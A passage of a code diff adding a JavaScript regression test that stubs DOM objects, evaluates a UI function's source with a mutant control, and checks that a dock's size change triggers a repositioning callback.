+    let h = 58, moved = 0; const item = { id: 'ut-r15sz', status: 'open' };
+    const row = { dataset: { id: item.id }, querySelector: () => null };
+    const rows = { querySelector: (q) => (/ut-item/.test(q) ? row : null), querySelectorAll: () => [], replaceChildren() {} };
+    const count = { textContent: '', title: '' }, all = { hidden: true, textContent: '' };
+    const dock = { hidden: false, get offsetHeight() { return this.hidden ? 0 : h; }, querySelector: (q) => (/cad-count/.test(q) ? count : /cad-all/.test(q) ? all : null) };
+    const self = { view: { _attnDock: dock }, _dockBuild: () => rows, _dockSig: '', _dockItem: null, app: { foryouRows: { reconcileDock: () => { h = self.next; }, arm() {}, chromeMoved: () => { moved++; } } } };
+    let f; try { f = new Function('scope', `with (scope) { return function (waiting) { ${src} }; }`)(new Proxy({ dockOf: (l) => (l.length ? { newest: l[0].item, n: l.length, words: { text: 'waiting for you · 1', title: '' } } : null), t: (k) => k, boxInUse: () => false, inboxModel: () => ({ todos: {} }), console }, { has: (o, k) => k in o })); } catch (e) { return { threw: String(e) }; }
+    return steps.map(([next, list]) => { moved = 0; self.next = next; f.call(self, list ? [{ item }] : []); return moved; });
+  };
+  const sz = sized(body(dps), [[58, true], [106, true], [106, true], [106, false]]);
+  const szm = sized(body(dps && dps.replace('    if (dock.offsetHeight !== h0) this.app.foryouRows?.chromeMoved?.();\n', '')), [[58, true], [106, true]]);
+  const cm = /chromeMoved: \(\) => \{ if \(annStack && annStack\.isConnected\) annPlace\(\); placeToastsSoon\(\); \},/.test(P);
+  ok(J(sz) === '[0,1,0,1]' && cm, `RED-able (r15 — 2353267f1: nothing followed a strip that grew but the 1 s tick): the REAL _dockPass says a size change — shown at its size ${J(sz[0])}, grown ${J(sz[1])}, the same ${J(sz[2])}, gone ${J(sz[3])} (calls of foryouRows.chromeMoved); chromeMoved re-places the stack and asks the toasts again`, { sz, cm });
+  ok(J(szm) === '[0,0]', `CONTROL (r15): the mutant without the size check never says the growth (${J(szm)}) — the leg goes red`, szm);
+}
 console.log(fail ? `\n${fail} FAILED (${pass} passed)` : `\nALL PASS (${pass})`);
 process.exit(fail ? 1 : 0);
